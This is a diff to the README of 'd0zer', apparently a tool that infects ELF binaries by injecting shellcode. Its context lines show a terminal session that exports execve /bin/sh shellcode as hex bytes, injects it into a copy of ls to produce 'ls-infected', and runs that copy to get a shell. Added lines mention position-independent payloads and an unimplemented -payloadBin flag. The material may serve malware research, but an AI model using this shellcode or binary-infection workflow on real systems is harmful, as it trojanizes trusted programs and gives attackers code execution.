@@ -86,8 +86,7 @@ Inceasing pHeader @ index 10 by 0x1000
 [sad0p@Arch-Deliberate d0zer]$ 
 </pre>
 
-A custom payload can be injected into the binary with the `-payloadEnv` flag. Below I inject a basic execve /bin/sh into the ls
-command as an example.
+A custom payload can be injected into the binary with the `-payloadEnv` flag. Below I inject a basic execve /bin/sh shellcode into the ls command as an example.
 
 <pre>
 [sad0p@Arch-Deliberate d0zer]$ export DOZEREGG="\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05"
@@ -95,3 +94,16 @@ command as an example.
 [sad0p@Arch-Deliberate d0zer]$ experimental/ls-infected
 sh-5.1$ 
 </pre>
+
+It's worth noting that code being injected should be position independent.
+
+The `-payloadBin` flag is currently not implemented, it would allow you to supply a PIE (binary), where the contents of the text
+segments would serve as the payload.
+
+<pre>
+[sad0p@Arch-Deliberate d0zer]$ ./d0zer -target experimental/ls -payloadBin ./non-destructive-payload64
+Getting payload from an ELF binary .text segment is not yet supported
+[sad0p@Arch-Deliberate d0zer]$ 
+</pre>
+
+# Advance Usage
